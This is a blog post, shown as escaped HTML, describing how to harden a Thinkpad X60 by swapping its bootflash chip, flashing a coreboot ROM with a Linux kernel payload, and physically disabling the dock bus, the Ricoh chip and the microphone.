&lt;p&gt;&lt;strong&gt;&lt;span class="caps"&gt;UPDATED&lt;/span&gt;:&lt;/strong&gt; (2014-01-13) To include corrections and additional comments from&amp;nbsp;Peter.&lt;/p&gt;
&lt;p&gt;The idea behind this is to build on top of the Thinkpad hardware modifications
which I mentioned in one of my last posts, and which were discussed by Peter
Stuge in his recent 30c3 talk,
&lt;a href="http://media.ccc.de/browse/congress/2013/30C3_-_5529_-_en_-_saal_2_-_201312271830_-_hardening_hardware_and_choosing_a_goodbios_-_peter_stuge.html"&gt;&amp;#8220;Hardening Hardware &lt;span class="amp"&gt;&amp;amp;&lt;/span&gt; Choosing a #goodBIOS&amp;#8221;&lt;/a&gt;. Pretty
much all of this post is the result of shouldersurfing Peter, asking way too
many questions, and writing down everything which seemed like I&amp;#8217;d forget it
and wished I knew it later when doing these modifications on my own. Peter
also took the photos used in this post; all credit, praise, hoorays, &lt;span class="caps"&gt;BTC&lt;/span&gt;,
dogecoin, and whatever else should go to Peter for his&amp;nbsp;work.&lt;/p&gt;
&lt;p&gt;Rather than relying on a
&lt;a href="http://www.coreboot.org/Welcome_to_coreboot"&gt;coreboot&lt;/a&gt; image which sits in
the onboard bootflash chip &amp;#8212; the default chip sadly has a volatile
write-protect pin that is reset to an unprotected write state on poweroff &amp;#8212;
we can replace this chip with a larger one.  In most laptops, the bootflash
chip is anywhere from &lt;span class="caps"&gt;1MB&lt;/span&gt; to &lt;span class="caps"&gt;4MB&lt;/span&gt;.  Newer &lt;span class="caps"&gt;UEFI&lt;/span&gt;-enabled machines are beginning
to push this limit, often requiring &lt;span class="caps"&gt;8MB&lt;/span&gt; chips, but this is still far from
ubiquitous in the marketplace.  If we pull the bootflash chip from the
mainboard and replace it with a larger one, we can flash it with a coreboot
image which contains a Linux kernel payload and initramfs, then set
write-protect though &amp;#8220;software&amp;#8221; (more like mediumware, if you ask me) via the
&lt;span class="caps"&gt;UART&lt;/span&gt; interface and/or through hardware by soldering a bridge between two of
the bootflash chip&amp;#8217;s pins.  This allows us to skip using a bootloader (such as
&lt;span class="caps"&gt;GRUB2&lt;/span&gt;, &lt;span class="caps"&gt;LILO&lt;/span&gt;, etc.) entirely, booting directly to the flashed&amp;nbsp;kernel.&lt;/p&gt;
&lt;h3&gt;Wait.  How reversible is this&amp;nbsp;process?&lt;/h3&gt;
&lt;p&gt;You should take a backup of the original blob on the original bootflash chip
before playing with it, of course.  If a chip is flashed with a disfunctional
&lt;span class="caps"&gt;ROM&lt;/span&gt;, the simplest (and least likely to damage the mainboard) method for
replacing the chip is to cut the pins again (as described below), desolder the
remaining pin stubs, and use a desoldering wick again to clean up the mess.
Provided you&amp;#8217;ve got a backup of the original blob, just flash that to a new
chip, resolder, and you should be back where you&amp;nbsp;started.&lt;/p&gt;
&lt;p&gt;There is a risk of bricking your mainboard while doing this.  You probably
shouldn&amp;#8217;t be doing this to your only machine, unless you enjoy the thrills of
living life out on the edge and potentially burning your safety blanket.
Please take everything I say with a handful of salt, I&amp;#8217;m currently traveling
and won&amp;#8217;t have a chance to try this until I return to the place I came from,
whenever that is.  And I cannot be held liable for your mistakes, legal
disclaimers legal disclaimers, blah blah&amp;nbsp;blah.&lt;/p&gt;
&lt;h3&gt;Where can I obtain a good replacement bootflash&amp;nbsp;chip?&lt;/h3&gt;
&lt;p&gt;Any &lt;span class="caps"&gt;8MB&lt;/span&gt; or &lt;span class="caps"&gt;16MB&lt;/span&gt; chip should do.  However, in many chips, the write-protect …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Using coreboot to directly initialise a Linux kernel&amp;nbsp;payload&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;&lt;span class="caps"&gt;UPDATED&lt;/span&gt;:&lt;/strong&gt; (2014-01-13) To include corrections and additional comments from&amp;nbsp;Peter.&lt;/p&gt;
&lt;p&gt;The idea behind this is to build on top of the Thinkpad hardware modifications
which I mentioned in one of my last posts, and which were discussed by Peter
Stuge in his recent 30c3 talk,
&lt;a href="http://media.ccc.de/browse/congress/2013/30C3_-_5529_-_en_-_saal_2_-_201312271830_-_hardening_hardware_and_choosing_a_goodbios_-_peter_stuge.html"&gt;&amp;#8220;Hardening Hardware &lt;span class="amp"&gt;&amp;amp;&lt;/span&gt; Choosing a #goodBIOS&amp;#8221;&lt;/a&gt;. Pretty
much all of this post is the result of shouldersurfing Peter, asking way too
many questions, and writing down everything which seemed like I&amp;#8217;d forget it
and wished I knew it later when doing these modifications on my own. Peter
also took the photos used in this post; all credit, praise, hoorays, &lt;span class="caps"&gt;BTC&lt;/span&gt;,
dogecoin, and whatever else should go to Peter for his&amp;nbsp;work.&lt;/p&gt;
&lt;p&gt;Rather than relying on a
&lt;a href="http://www.coreboot.org/Welcome_to_coreboot"&gt;coreboot&lt;/a&gt; image which sits in
the onboard bootflash chip &amp;#8212; the default chip sadly has a volatile
write-protect pin that is reset to an unprotected write state on poweroff &amp;#8212;
we can replace this chip with a larger one.  In most laptops, the bootflash
chip is anywhere from &lt;span class="caps"&gt;1MB&lt;/span&gt; to &lt;span class="caps"&gt;4MB&lt;/span&gt;.  Newer &lt;span class="caps"&gt;UEFI&lt;/span&gt;-enabled machines are beginning
to push this limit, often requiring &lt;span class="caps"&gt;8MB&lt;/span&gt; chips, but this is still far from
ubiquitous in the marketplace.  If we pull the bootflash chip from the
mainboard and replace it with a larger one, we can flash it with a coreboot
image which contains a Linux kernel payload and initramfs, then set
write-protect though &amp;#8220;software&amp;#8221; (more like mediumware, if you ask me) via the
&lt;span class="caps"&gt;UART&lt;/span&gt; interface and/or through hardware by soldering a bridge between two of
the bootflash chip&amp;#8217;s pins.  This allows us to skip using a bootloader (such as
&lt;span class="caps"&gt;GRUB2&lt;/span&gt;, &lt;span class="caps"&gt;LILO&lt;/span&gt;, etc.) entirely, booting directly to the flashed&amp;nbsp;kernel.&lt;/p&gt;
&lt;h3&gt;Wait.  How reversible is this&amp;nbsp;process?&lt;/h3&gt;
&lt;p&gt;You should take a backup of the original blob on the original bootflash chip
before playing with it, of course.  If a chip is flashed with a disfunctional
&lt;span class="caps"&gt;ROM&lt;/span&gt;, the simplest (and least likely to damage the mainboard) method for
replacing the chip is to cut the pins again (as described below), desolder the
remaining pin stubs, and use a desoldering wick again to clean up the mess.
Provided you&amp;#8217;ve got a backup of the original blob, just flash that to a new
chip, resolder, and you should be back where you&amp;nbsp;started.&lt;/p&gt;
&lt;p&gt;There is a risk of bricking your mainboard while doing this.  You probably
shouldn&amp;#8217;t be doing this to your only machine, unless you enjoy the thrills of
living life out on the edge and potentially burning your safety blanket.
Please take everything I say with a handful of salt, I&amp;#8217;m currently traveling
and won&amp;#8217;t have a chance to try this until I return to the place I came from,
whenever that is.  And I cannot be held liable for your mistakes, legal
disclaimers legal disclaimers, blah blah&amp;nbsp;blah.&lt;/p&gt;
&lt;h3&gt;Where can I obtain a good replacement bootflash&amp;nbsp;chip?&lt;/h3&gt;
&lt;p&gt;Any &lt;span class="caps"&gt;8MB&lt;/span&gt; or &lt;span class="caps"&gt;16MB&lt;/span&gt; chip should do.  However, in many chips, the write-protect bit
is volatile and is reset (to an unprotected write state) at power&amp;nbsp;off.&lt;/p&gt;
&lt;p&gt;Chips which are known to have a non-volatile write bit are produced by
Macronix and&amp;nbsp;Winbond.&lt;/p&gt;
&lt;h3&gt;How do I find the correct chip to&amp;nbsp;pull?&lt;/h3&gt;
&lt;p&gt;In a Thinkpad X60, the bootflash chip, &lt;strike&gt;also called a Firmware Hub
(&lt;span class="caps"&gt;FWH&lt;/span&gt;),&lt;/strike&gt; is an &lt;span class="caps"&gt;SPI&lt;/span&gt; chip located on the mainboard, on an &lt;span class="caps"&gt;LPC&lt;/span&gt; bus
connected to the southbridge. It should be labelled something like
&lt;code&gt;MX25L1605D&lt;/code&gt;, and it&amp;#8217;s directly adjacent to some Lenovo chip called a
&lt;strike&gt;U72&lt;/strike&gt; &lt;span class="caps"&gt;PMH&lt;/span&gt;-7, the latter of which is an embedded &lt;span class="caps"&gt;ASIC&lt;/span&gt; power
management controller, the largest chip in the area and not important for our
purposes, however useful for locating the bootflash chip. Both are near the
two adjacent &lt;span class="caps"&gt;USB&lt;/span&gt;&amp;nbsp;hubs:&lt;/p&gt;
&lt;p&gt;&lt;img alt="x60-bootflash-location" src="https://blog.patternsinthevoid.net/images/2013/12/x60-bootflash-location-small.jpg"&gt;&lt;/p&gt;
&lt;p&gt;The chipnames from the labels in the above photo can also be seen in
&lt;a href="https://blog.patternsinthevoid.net/images/2013/12/30c3-hhacagb/schematic/01-page.jpg"&gt;this block diagram&lt;/a&gt;,
and
&lt;a href="https://blog.patternsinthevoid.net/images/2013/12/30c3-hhacagb/schematic/02-closeup.jpg"&gt;here&amp;#8217;s a closeup&lt;/a&gt;
of the section from that diagram pertaining to that &lt;span class="caps"&gt;LPC&lt;/span&gt;&amp;nbsp;bus.&lt;/p&gt;
&lt;p&gt;Peter responded with the following explanation of &lt;span class="caps"&gt;SPI&lt;/span&gt; versus &lt;span class="caps"&gt;FWH&lt;/span&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;How to access the boot flash has changed over time; originally it was all
paralell on an &lt;span class="caps"&gt;ISA&lt;/span&gt; bus, then came &lt;span class="caps"&gt;LPC&lt;/span&gt;, a 4-bit wide serial bus designed
by intel, with two different and incompatible commands (yay!) for reading
memory at a 32-bit address, one called &amp;#8220;memory read&amp;#8221;, the other called
&amp;#8220;firmware memory&amp;nbsp;read&amp;#8221;.&lt;/p&gt;
&lt;p&gt;Intel made chipsets which required the latter and flash chips which responded
to the latter, and called such flash chips a &amp;#8220;firmware hub&amp;#8221;. Other chipset and
flash chip makers instead used the &amp;#8220;memory read&amp;#8221; command and didn&amp;#8217;t invent any
particular names for their flash chips. They&amp;#8217;re generally called &lt;span class="caps"&gt;LPC&lt;/span&gt; flash,
although that&amp;#8217;s technically accurate for an &lt;span class="caps"&gt;FWH&lt;/span&gt; chip as&amp;nbsp;well.&lt;/p&gt;
&lt;p&gt;Then came &lt;span class="caps"&gt;SPI&lt;/span&gt;, the 1-bit wide serial interconnect mostly used today to save
on &lt;span class="caps"&gt;PCB&lt;/span&gt; traces. To be fair, &lt;span class="caps"&gt;SPI&lt;/span&gt; was originally designed by motorola for
interconnecting microcontroller peripherals. &amp;#8220;Serial Peripheral Interconnect&amp;#8221;
the same is probably true for the memory access protocol used in PCs&amp;nbsp;now.&lt;/p&gt;
&lt;p&gt;So &lt;span class="caps"&gt;SPI&lt;/span&gt; and &lt;span class="caps"&gt;FWH&lt;/span&gt; are mutually exclusive. The X60 schematic and &lt;span class="caps"&gt;PCB&lt;/span&gt; is from
a time just before &lt;span class="caps"&gt;SPI&lt;/span&gt; became the norm so it was designed to use either
&lt;span class="caps"&gt;SPI&lt;/span&gt; or &lt;span class="caps"&gt;FWH&lt;/span&gt;, but in practice I&amp;#8217;ve only seen &lt;span class="caps"&gt;SPI&lt;/span&gt;&amp;nbsp;used.&lt;/p&gt;
&lt;p&gt;U72 is the identifier in the schematic for the &lt;span class="caps"&gt;PMH&lt;/span&gt;-7 chip.
(U means it&amp;#8217;s some sort of integrated circuit and 72 means it&amp;#8217;s the 72nd &lt;span class="caps"&gt;IC&lt;/span&gt;)
I&amp;#8217;d just refer to the lenovo chip as &lt;span class="caps"&gt;PMH&lt;/span&gt;-7.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;How do I pull the&amp;nbsp;chip?&lt;/h3&gt;
&lt;p&gt;The
&lt;a href="http://www.coreboot.org/Soldering_a_socket_on_your_board#Cutting_the_chip"&gt;simple way&lt;/a&gt;
is to pull the factory chip is to cut the pins, as close to the chip packaging
as possible, then desolder the remaining eight pin stubs.  And finally, use a
desoldering wick to cleanup whatever mess is&amp;nbsp;leftover.&lt;/p&gt;
&lt;h3&gt;Is there a size limit to the new chip? Can I just use a &lt;span class="caps"&gt;64MB&lt;/span&gt;&amp;nbsp;chip?&lt;/h3&gt;
&lt;p&gt;The size of the bootflash chip is limited by the &lt;span class="caps"&gt;SPI&lt;/span&gt; protocol.  The largest
chip which can be used is &lt;span class="caps"&gt;16MB&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;While it would be nice to use a huge chip, so that we have extra room for a
larger kernel and initramfs, the &lt;span class="caps"&gt;SPI&lt;/span&gt; addressing scheme only has 24 bits, which
limits the size of the replacement bootflash chip.  It seems whichever old
Unix-beardos back in the Epoch days designed the &lt;span class="caps"&gt;SPI&lt;/span&gt; protocol couldn&amp;#8217;t foresee
anyone ever wanting anything larger.  (Futureproofing, assholes.  It&amp;#8217;s a&amp;nbsp;thing.)&lt;/p&gt;
&lt;h2&gt;How do I flash a Linux kernel and initramfs to the new, larger&amp;nbsp;chip?&lt;/h2&gt;
&lt;hr&gt;
&lt;h3&gt;Compiling a Linux&amp;nbsp;kernel&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;“Any project whose instructions begin&amp;nbsp;with&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;    ‘First, compile a kernel…’&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;is not a project you want to be&amp;nbsp;doing.”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;I don&amp;#8217;t remember who told me this, but whatever, doesn&amp;#8217;t matter.  They were
totally wrong.  &lt;em&gt;Fuck you, Dad, I do what I want!  I&amp;#8217;m not mowing the&amp;nbsp;lawn.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;So… first, compile a Linux kernel.  If you&amp;#8217;ve never done this, please don&amp;#8217;t
ask me for help.  While kernel hackers certainly are not known for their
documentation prowess, there are plenty of tutorials on the internet to help
you with this step.  I remember finding
&lt;a href="https://wiki.debian.org/HowToRebuildAnOfficialDebianKernelPackage"&gt;these&lt;/a&gt;
&lt;a href="http://verahill.blogspot.com.au/2012/02/debian-testing-building-your-own-linux.html"&gt;resources&lt;/a&gt;
&lt;a href="http://web.archive.org/web/20120606074417/http://www.ericrswanson.info/Wordpress/building-the-linux-kernel-on-debian-based-systems/"&gt;helpful&lt;/a&gt;.
You also can have a look at
&lt;a href="https://code.patternsinthevoid.net/?p=scripts.git;a=blob;f=build_kernel;hb=HEAD"&gt;my kernel build scripts&lt;/a&gt;
(beware, I&amp;#8217;ve not used that script to build a kernel image for a coreboot &lt;span class="caps"&gt;ROM&lt;/span&gt;
yet); perhaps it will&amp;nbsp;help.&lt;/p&gt;
&lt;p&gt;You&amp;#8217;ll want to strip down your kernel &lt;em&gt;as small as possible&lt;/em&gt; (i.e. by removing
drivers/support for hardware/devices which don&amp;#8217;t exist in your machine).  And,
preferably, compile it monolithically (all modules compiled in, and support
for additional module loading disabled).  If you &lt;em&gt;really&lt;/em&gt; want module support
for some reason, it could be interesting to look into the
&lt;a href="https://lwn.net/Articles/470906/"&gt;kernel module signing features&lt;/a&gt; which were
added into
&lt;a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=106a4ee258d14818467829bf0e12aeae14c16cd7"&gt;Torvald&amp;#8217;s&lt;/a&gt;
&lt;a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=48ba2462ace6072741fd8d0058207d630ce93bf1"&gt;main&lt;/a&gt;
&lt;a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ea0b6dcf71d216dc11733ac19b26df0f5d0fd6c2"&gt;tree&lt;/a&gt;
&lt;a href="http://kernelnewbies.org/Linux_3.7#head-a04c2b7827323d26a659b3b7cdf759747bb400d2"&gt;during the 3.7 release&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Peter&amp;nbsp;wrote:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The kernel file needed is called bzImage, that&amp;#8217;s the actual filename. After
running &lt;code&gt;make&lt;/code&gt; it&amp;#8217;s in &lt;code&gt;arch/x86/boot/bzImage&lt;/code&gt; in the kernel source tree and
it is the file bootloaders normally use, grub as well as&amp;nbsp;lilo.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Adding an initramfs into the&amp;nbsp;kernel&lt;/h3&gt;
&lt;p&gt;Additionally, while compiling the kernel, there are options to specify the
location of an
&lt;a href="http://www.linuxfromscratch.org/blfs/view/svn/postlfs/initramfs.html"&gt;initramfs&lt;/a&gt;
which will get compiled into the kernel (you&amp;#8217;ll hit these when you edit the
kernel config, e.g. when you do &lt;code&gt;make-menuconfig&lt;/code&gt; or &lt;code&gt;make-config&lt;/code&gt;):&lt;/p&gt;
&lt;pre style="font-size: 90%" class="prettyprint lang-bash"&gt;
 CONFIG_BLK_DEV_INITRD=y
 CONFIG_INITRAMFS_SOURCE="/usr/src/initramfs"
&lt;/pre&gt;

&lt;p&gt;There is a decent
&lt;a href="http://wiki.gentoo.org/wiki/Custom_Initramfs"&gt;Gentoo wiki page on the directory layout requirements for building a custom initramfs&lt;/a&gt;.
Keeping in mind, of course, that your whole coreboot + kernel + initramfs will
need to be small enough to flash onto the chip&amp;nbsp;later.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span class="caps"&gt;TODO&lt;/span&gt;:&lt;/strong&gt; My current, statically-linked, tor-0.2.4.20 binary is &lt;span class="caps"&gt;8MB&lt;/span&gt;, and
stripping the object symbols with
&lt;pre style="font-size: 90%" class="prettyprint lang-bash"&gt;
 strip --strip-all '/path/to/tor-0.2.4.20'
&lt;/pre&gt; I can get it down to 1.&lt;span class="caps"&gt;8MB&lt;/span&gt;.  It would be nice to see if we can get a
working kernel for a Thinkpad X60, with an initramfs which includes basic
security and communications software such as
&lt;a href="https://gitweb.torproject.org/tor.git"&gt;Tor&lt;/a&gt;,
&lt;a href="https://github.com/agl/xmpp-client"&gt;xmpp-client&lt;/a&gt;,
&lt;a href="http://git.gnupg.org/cgi-bin/gitweb.cgi?p=gnupg.git;a=summary"&gt;gnupg&lt;/a&gt;, and,
most likely, ssh, cryptsetup, and a busybox as&amp;nbsp;well.&lt;/p&gt;
&lt;h3&gt;Compiling the kernel into a CoreBoot &lt;span class="caps"&gt;ROM&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;Then compile the kernel into a CoreBoot &lt;span class="caps"&gt;ROM&lt;/span&gt;.  There isn&amp;#8217;t much documentation
of this process yet, but my understanding from looking over the CoreBoot
source tree would be to use the &lt;code&gt;PAYLOAD_LINUX&lt;/code&gt; option in
&lt;a href="http://review.coreboot.org/gitweb?p=coreboot.git;a=blob;f=src/Kconfig;h=1c80b8c194ecfb994b60f0be5c72b3460ec3b60f;hb=9bf05de5ab2842fc83cea8da5e9058417fc4bc24#l543"&gt;the included Kconfig file&lt;/a&gt;
to specify the path to the &lt;code&gt;bzImage&lt;/code&gt; of your compiled kernel.  If you try this
before I get a chance to, it would be great if you could document the steps
involved and &lt;a href="mailto:isis@torproject.org"&gt;send them to me&lt;/a&gt; and I&amp;#8217;ll add them&amp;nbsp;here.&lt;/p&gt;
&lt;p&gt;Peter&amp;nbsp;added:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Indeed making coreboot use a kernel as payload is done during coreboot
&amp;#8216;make menuconfig&amp;#8217; (or make config if you prefer) by entering the Payload
submenu, selecting &amp;#8220;A Linux payload&amp;#8221; and specifying the path to the bzImage
file in the kernel source&amp;nbsp;tree.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;How can I sign the kernel which gets flashed to the new&amp;nbsp;chip?&lt;/h3&gt;
&lt;p&gt;This needs to be researched further.  Likely, commands for this could be
placed directly into the initramfs&amp;#8217;s /init script.  As mentioned above, the
kernel itself supports module signing, though this is neither sufficient nor
necessary given the benefits of a monolithic kernel in this context.  It could
be possible to get a &lt;span class="caps"&gt;TPM&lt;/span&gt; chip (see the &lt;code&gt;tpm_tis&lt;/code&gt; kernel module) to keep keys
required for checking a kernel signature, though I know very little about &lt;span class="caps"&gt;TPM&lt;/span&gt;.
It&amp;#8217;s also likely that someone else has already worked on&amp;nbsp;this.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The kernel and initramfs in boot flash don&amp;#8217;t strictly need to be signed
because the flash chip is made read-only in hardware once they have been
written to it. That hardware write protection is the root of trust. If
someone has access to the hardware long enough to tamper with the flash chip
then game over&amp;nbsp;anyway.&lt;/p&gt;
&lt;p&gt;One further step is possible: adding &lt;span class="caps"&gt;TPM&lt;/span&gt; support to coreboot, having
coreboot measure itself and then using the &lt;span class="caps"&gt;TPM&lt;/span&gt; to unseal an encrypted
kernel+initramfs. I&amp;#8217;m not sure if that would actually have any
advantages. However - the initramfs used with the kernel could, and should,
check signatures of whatever it starts. That still needs to be designed. &amp;#8212;&amp;nbsp;Peter&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Prior&amp;nbsp;modifications&lt;/h2&gt;
&lt;hr&gt;
&lt;p&gt;I&amp;#8217;ll briefly cover the prior modifications.  Peter was nice enough to drop me
a
&lt;a href="https://blog.patternsinthevoid.net/images/2013/12/30c3-hardening_hardware_and_choosing_a_goodbios-photos.tar.bz2"&gt;tarball of all the images from the slides in his talk&lt;/a&gt;,
which is fortunate because my camera and I are currently not exactly on
speaking&amp;nbsp;terms.&lt;/p&gt;
&lt;h3&gt;&lt;span class="caps"&gt;STEP&lt;/span&gt;&amp;nbsp;1:&lt;/h3&gt;
&lt;p&gt;Remove the keyboard and palmrest from the chassis: &lt;img alt="removing-keyboard" src="https://blog.patternsinthevoid.net/images/2013/12/001-025.removing-keyboard_small.gif"&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;span id="step2wrapper" style="align:left; float:left; width:100%;"&gt;&lt;table
id="step2" style="float:right; clear:right; width:65%; padding:0.2em;"&gt;&lt;tbody&gt;
&lt;tr&gt;
  &lt;td style="text-align:center; padding:0.2em;"&gt;
    &lt;img alt="PC87382-pin-diagram" width="400px"
         src="./static/images/2013/12/external-dock-LPC-forwarder_small.jpg" /&gt;
  &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td style="text-align:center; padding: 0.2em;"&gt;
    &lt;p&gt;&lt;code&gt;PC87382&lt;/code&gt; Pin Diagram&lt;a href="./static/images/2013/12/external-dock-LPC-forwarder.jpg"&gt;(larger&amp;nbsp;image)&lt;/a&gt;&lt;/p&gt;
  &lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span class="caps"&gt;STEP&lt;/span&gt;&amp;nbsp;2:&lt;/h3&gt;
&lt;p&gt;Next, disconnect pins &lt;code&gt;4&lt;/code&gt;, &lt;code&gt;18&lt;/code&gt;, &lt;code&gt;20&lt;/code&gt;,
&lt;code&gt;26&lt;/code&gt;, &lt;code&gt;29&lt;/code&gt;, &lt;code&gt;31&lt;/code&gt;,
&lt;code&gt;33&lt;/code&gt;, &lt;code&gt;37&lt;/code&gt;, &lt;code&gt;39&lt;/code&gt;, &lt;code&gt;41&lt;/code&gt;,
&lt;code&gt;42&lt;/code&gt; on a chip labelled &lt;code&gt;PC87382&lt;/code&gt;, which forwards bus
communications through two &lt;span class="caps"&gt;LPC&lt;/span&gt; buses from an external dock. To disconnect
them, simply get a scalpel and carefully  cut them from the chip&amp;#8217;s packaging, and then desolder
the severed pins from the pads on the&amp;nbsp;mainboard.&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Photo 041 shows severed pins soldered into the pads. I strongly
recommend to remove the pins, as I try to show in photos 043-044, to end up
with a result such as in photo 045 without any pins left. This step matters
because it&amp;#8217;s significantly easier to reconnect the pins to the chip if the
original pins are left on the mainboard. Someone could probably do that in an
airplane lavatory, modulo the fire alarm. No pins left on the board makes it
more difficult to reconnect the chip. But then again, if someone can work on
the mainboard they can just replace the boot flash instead. &amp;#8212;&amp;nbsp;Peter&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="external-dock-pin-cutting" src="./static/images/2013/12/026-032.034-049.external-dock-pin-cutting.gif"&gt;&lt;/img&gt;&lt;/p&gt;
&lt;/p&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span class="caps"&gt;STEP&lt;/span&gt;&amp;nbsp;3:&lt;/h3&gt;
&lt;p&gt;Remove the speaker, the internal wifi card, and the 3g module (if there is one&amp;nbsp;present):&lt;/p&gt;
&lt;p&gt;&lt;img alt="remove-wifi-3g" src="https://blog.patternsinthevoid.net/images/2013/12/051-056.remove-radios_small.gif"&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span class="caps"&gt;STEP&lt;/span&gt;&amp;nbsp;4:&lt;/h3&gt;
&lt;p&gt;Remove mainboard and power adapter from&amp;nbsp;chassis.&lt;/p&gt;
&lt;p&gt;&lt;img alt="remove-mainboard" src="https://blog.patternsinthevoid.net/images/2013/12/056-111.remove-mainboard_small.gif"&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;span id="step5wrapper" style="align:left; float:left; width:100%;"&gt;&lt;table
id="step5" style="float:left; clear:left; width:65%; padding:0.2em;"&gt;&lt;tbody&gt;
&lt;tr&gt;
  &lt;td style="text-align:center; padding:0.2em;"&gt;
    &lt;img alt="Cardbus PDN2 Schematic" width="400px"
         src="./static/images/2013/12/30c3-hhacagb/schematic/05-cardbuspdn2.jpg" /&gt;
  &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td style="text-align:center; padding: 0.2em;"&gt;
    &lt;p&gt;Schematic showing resistor &lt;code&gt;R461&lt;/code&gt;&lt;a href="./static/images/2013/12/30c3-hhacagb/schematic/05-cardbuspdn2.jpg"&gt;(larger&amp;nbsp;image)&lt;/a&gt;&lt;/p&gt;
  &lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span class="caps"&gt;STEP&lt;/span&gt;&amp;nbsp;5:&lt;/h3&gt;
&lt;p&gt;Disable the Ricoh chip in order to disable the cardbus, firewire, and sdcard&amp;nbsp;reader.&lt;/p&gt;
&lt;p&gt;To do this, lift the clear, sticky plastic protector, the one on the top of
the mainboard underneath the wifi + 3g cards, near the corner which has two
&lt;span class="caps"&gt;USB&lt;/span&gt; ports on it. Remove resistor &lt;code&gt;R461&lt;/code&gt;, which is responsible for
controlling powerdown signal for the &lt;a
href="http://www.hktdc.com/manufacturers-suppliers/Rico-Ind-l-Co/en/1X00202Y/"&gt;Ricoh
chip&lt;/a&gt;. Connect pin &lt;code&gt;2&lt;/code&gt; of &lt;code&gt;R461&lt;/code&gt; (the one closest to
the &lt;span class="caps"&gt;USB&lt;/span&gt; ports) to pin &lt;code&gt;1&lt;/code&gt; of &lt;code&gt;R348&lt;/code&gt;, which is just above
&lt;code&gt;R461&lt;/code&gt; kind of by&amp;nbsp;itself.&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;The lone brown component north of R461 is a capacitor,
unfortunately its identifier can&amp;#8217;t be seen in the photos because this
particular &lt;span class="caps"&gt;PCB&lt;/span&gt; uses a much larger font size than most other boards I&amp;#8217;ve seen,
so the identifiers don&amp;#8217;t fit next to their components. (There&amp;#8217;s an &lt;span class="caps"&gt;AA&lt;/span&gt;
reference north-northwest of R461 and there will be an &lt;span class="caps"&gt;AA&lt;/span&gt; legend somewhere
else on that board, but that doesn&amp;#8217;t help us much. It&amp;#8217;s unfortunate but that&amp;#8217;s
the only board I had available when taking the photos. :) The identifiers can
still be used as reference points though, as long as they aren&amp;#8217;t mistaken for
the actual identifiers for the components to be removed or modified. &amp;#8212;&amp;nbsp;Peter
&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;When you&amp;#8217;re done, drop the protective plastic back down over&amp;nbsp;it:&lt;/p&gt;
&lt;p&gt;&lt;img alt="remove-R461" src="./static/images/2013/12/112-130.remove-R461_small.gif"&gt;&lt;/img&gt;&lt;/p&gt;
&lt;/p&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span class="caps"&gt;STEP&lt;/span&gt;&amp;nbsp;6:&lt;/h3&gt;
&lt;p&gt;Remove the&amp;nbsp;microphone.&lt;/p&gt;
&lt;p&gt;The microphone is a small, round, silver thing &amp;#8212; mostly likely underneath a
sheet of opaque, black, protective plastic on the topside of the mainboard,
between the firewire and &lt;span class="caps"&gt;USB&lt;/span&gt; connectors. Desolder it from the bottom of the
board while pulling it out from the top with a pair of&amp;nbsp;pliers.&lt;/p&gt;
&lt;p&gt;&lt;img alt="remove-microphone" src="https://blog.patternsinthevoid.net/images/2013/12/131-147.remove-microphone_small.gif"&gt;&lt;/p&gt;
&lt;h2&gt;Flashing the bootflash&amp;nbsp;chip&lt;/h2&gt;
&lt;hr&gt;
&lt;p&gt;Obtain any &lt;span class="caps"&gt;SPI&lt;/span&gt;-compatible programming interface module.  Peter was using a
&lt;a href="http://enterpoint.co.uk/products/modules/ft4232-module/"&gt;&lt;span class="caps"&gt;FT4232H&lt;/span&gt; Mini Module&lt;/a&gt;
with this handy looking 8-pin clamp, a
&lt;a href="http://www.hmcelectronics.com/product/Pomona/5250"&gt;Pomono 5250 8-pin test clamp&lt;/a&gt;
to connect to the bootflash chip while it sits on the mainboard. This is the
what the test clip looks like while it is attached to the bootflash chip
during&amp;nbsp;reflashing:&lt;/p&gt;
